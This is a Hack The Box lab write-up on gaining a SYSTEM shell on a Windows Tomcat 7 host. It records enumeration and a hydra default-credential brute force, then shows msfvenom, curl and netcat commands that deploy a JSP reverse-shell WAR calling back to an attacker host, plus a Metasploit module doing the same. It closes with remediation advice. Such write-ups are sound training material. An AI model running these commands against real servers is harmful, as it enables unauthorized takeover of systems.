---
title: "Jerry — Tomcat Manager Default Credentials to SYSTEM Shell"
description: "Default Tomcat Manager credentials allow WAR deployment, producing an immediate SYSTEM shell."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - windows
  - tomcat
  - default-credentials
  - war-deployment
objective: "Validate the documented default-credential path from Tomcat Manager access to OS-level control."
tools:
  - nmap
  - gobuster
  - hydra
  - curl
  - msfvenom
  - netcat
  - metasploit
skill: "Exploitation of exposed Tomcat management interfaces and default credentials"
outcome: "SYSTEM-level command execution via WAR deployment through the Tomcat Manager"
---

## At a glance

| Field | Value |
|---|---|
| Difficulty | Easy |
| Target environment | Windows Server 2012 R2 (Apache Tomcat 7.0.88) |
| Starting position | Unauthenticated network access |
| Objective | Validate the documented default-credential path from Tomcat Manager access to OS-level control |
| Outcome | SYSTEM-level command execution through Tomcat Manager WAR deployment |

## From Tomcat defaults to a SYSTEM shell

Jerry is an Easy-rated Hack The Box Windows lab whose only exposed service is Apache Tomcat 7.0.88, with the Manager application reachable without IP restriction. The Manager authenticates with credentials shown in Tomcat's own sample configuration, and its legitimate WAR deployment feature executes a JSP reverse shell under the `NT AUTHORITY\SYSTEM` account that runs the service. This writeup replaces target identifiers, credentials, and secret values with role-based placeholders and leaves command syntax intact. See [how evidence is handled](/method/).

**Attack path:** **Exposed Tomcat Manager → default credentials → authenticated WAR deployment → JSP reverse shell → SYSTEM command execution**

## A Tomcat 7 host with no provided credentials

- **Target:** Windows Server 2012 R2 running Apache Tomcat 7.0.88, an older release in the 7.x branch.
- **Exposed service:** HTTP on TCP 8080, exposing the Manager and Host Manager applications.
- **Starting position:** unauthenticated network access, with no provided credentials.
- **Objective:** validate the documented default-credential attack path from Tomcat Manager access to OS-level control.
- **Constraints:** activity stayed inside the Hack The Box lab environment.

## Evidence: default credentials to WAR deployment

### 1. Service Enumeration

Observation: a full TCP scan returns a single open service.

```bash
nmap -sC -sV -p- --min-rate 5000 -oA <SCAN_OUT_PREFIX> <TARGET_IP>
```

```text
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88
```

Significance: the host presents one attack surface, and the version banner identifies an older Tomcat release.

Result: one exposed HTTP service running Apache Tomcat 7.0.88 is identified.

### 2. Web Enumeration and Manager Discovery

Observation: directory enumeration identifies the built-in management interfaces.

```bash
gobuster dir -u http://<TARGET_IP>:8080 \
  -w /usr/share/seclists/Discovery/Web-Content/tomcat.txt \
  -t 40 -o gobuster.out
```

```text
/manager/html
/host-manager/html
/examples/
```

Significance: the Tomcat Manager provides authenticated users with the ability to deploy, start, stop, and undeploy web applications, so access to it is functionally equivalent to code execution on the host. Requesting `/manager/html` triggers a Basic Authentication prompt.

Result: the Manager application is reachable and requires authentication; the Host Manager and default examples are also exposed.

### 3. Credential Discovery and Validation

Observation: cancelling the Basic Authentication prompt returns a Tomcat error page that includes a sample `tomcat-users.xml` snippet with example credentials.

```xml
<role rolename="manager-gui"/>
<user username="tomcat" password="<DEFAULT_PASSWORD>" roles="manager-gui"/>
```

Action: Against the Manager interface, I checked the documented example credential pattern and then confirmed it directly.

```bash
hydra -L /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt \
      -P /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt \
      -f -s 8080 <TARGET_IP> http-get /manager/html
```

```text
[8080][http-get] host: <TARGET_IP>   login: <TOMCAT_USER>   password: <TOMCAT_PASSWORD>
```

```bash
curl -u <TOMCAT_USER>:<TOMCAT_PASSWORD> http://<TARGET_IP>:8080/manager/html -I
```

```text
HTTP/1.1 200 OK
```

Significance: the sample credentials in Tomcat's documentation are reusable defaults; when an administrator follows the example verbatim, the Manager grants authenticated deployment capability to anyone who reads that page.

Result: a default credential pair is recovered and subsequently validated through the Tomcat Manager, which returns HTTP 200.

### 4. WAR Deployment to a SYSTEM Shell

Observation: the Manager's `/manager/text/deploy` API accepts a WAR upload at an arbitrary context path, which provides authenticated code execution.

Action: a JSP reverse-shell WAR was generated, uploaded through the Manager API, and triggered by requesting the embedded JSP.

```bash
msfvenom -p java/jsp_shell_reverse_tcp \
  LHOST=<ATTACKER_HOST> \
  LPORT=<LISTEN_PORT> \
  -f war \
  -o shell.war
```

```bash
curl -u <TOMCAT_USER>:<TOMCAT_PASSWORD> \
  http://<TARGET_IP>:8080/manager/text/deploy?path=/shell \
  --upload-file shell.war
```

```text
OK - Deployed application at context path [/shell]
```

```bash
nc -lvnp <LISTEN_PORT>
```

```bash
curl http://<TARGET_IP>:8080/shell/<JSP_FILENAME>.jsp
```

The trigger request connects back to the listener:

```text
connect to [<ATTACKER_HOST>] from (UNKNOWN) [<TARGET_IP>]
Microsoft Windows [Version 6.3.9600]

<TOMCAT_HOME>>whoami
nt authority\system
```

Significance: the Manager's legitimate deployment mechanism is the code-execution primitive, and because the Tomcat service runs under the SYSTEM account, the deployed JSP inherits OS-level privileges immediately.

Result: the privileged `whoami` output confirms command execution as `NT AUTHORITY\SYSTEM`; no privilege escalation step was required.

### 5. Alternative Metasploit Path

Observation: the `exploit/multi/http/tomcat_mgr_upload` module automates the same WAR deployment technique.

```text
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS <TARGET_IP>
set RPORT 8080
set HttpUsername <TOMCAT_USER>
set HttpPassword <TOMCAT_PASSWORD>
set LHOST <ATTACKER_HOST>
set LPORT <LISTEN_PORT>
set PAYLOAD java/meterpreter/reverse_tcp
run
```

```text
[*] Meterpreter session 1 opened
meterpreter> getuid
Server username: NT AUTHORITY\SYSTEM
```

Significance: the manual and automated methods reach the same execution context with the same valid credentials.

Result: the module reproduces SYSTEM-level code execution on the same target.

## Challenges and Decisions

No significant obstacles were encountered: the default credential was valid on the first attempt and the WAR deployment completed without error. Tomcat's sample configuration and the absence of IP restrictions on the Manager are configuration weaknesses rather than exploitable software bugs, so no troubleshooting or workaround was required.

## Outcome: SYSTEM shell through WAR deployment

The privileged `whoami` output confirms SYSTEM-level command execution obtained by deploying a JSP reverse-shell WAR through the Tomcat Manager authenticated with default credentials, and the Metasploit module reproduces the same result. No privilege escalation was required because the Tomcat service runs as `NT AUTHORITY\SYSTEM`. The demonstrated activity is confined to a single-host Hack The Box lab, and the deployed JSP filename and credential values are omitted.

## Recommendations: default accounts, Manager exposure, and service privilege

The compromise itself was demonstrated. Remediation was not reproduced, and none of the controls below was validated.

1. **Documented default credentials left active.** Tomcat's sample `tomcat-users.xml` ships example accounts for documentation, and a deployment that keeps them grants any network peer authenticated Manager access. *Recommendation:* remove the sample accounts and set unique credentials before the server is exposed. *Detection:* monitor Manager logins that use default or sample account names. *Validation:* confirm during deployment review that no sample accounts remain in `conf/tomcat-users.xml`.
2. **Manager reachable without IP restriction.** Authenticated access to the Manager allows WAR deployment and therefore code execution. *Recommendation:* restrict the Manager and Host Manager to trusted hosts with a `RemoteAddrValve` in `conf/Catalina/localhost/manager.xml`.
3. **Tomcat running under `NT AUTHORITY\SYSTEM`.** Because the service held SYSTEM privileges, a deployed WAR yielded immediate OS-level control. *Recommendation:* run Tomcat under a dedicated least-privileged service account with write access limited to its own directories.

## References

- [Hack The Box — Jerry](https://app.hackthebox.com/machines/Jerry) (retired machine)
- [Apache Tomcat 7 — Manager Application HOW-TO](https://tomcat.apache.org/tomcat-7.0-doc/manager-howto.html) (Manager access configuration and deployment API)
- [Apache Tomcat 7 — Valve Configuration](https://tomcat.apache.org/tomcat-7.0-doc/config/valve.html) (`RemoteAddrValve` access control)
- [Apache Tomcat — Which Version](https://tomcat.apache.org/whichversion.html) (supported release lines and lifecycle)
- [Metasploit — Tomcat Manager Upload](https://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_upload/)
- [Nmap Reference Guide](https://nmap.org/book/man.html)
- [Gobuster](https://github.com/OJ/gobuster)
- [THC-Hydra](https://github.com/vanhauser-thc/thc-hydra)
- [curl — man page](https://curl.se/docs/manpage.html)
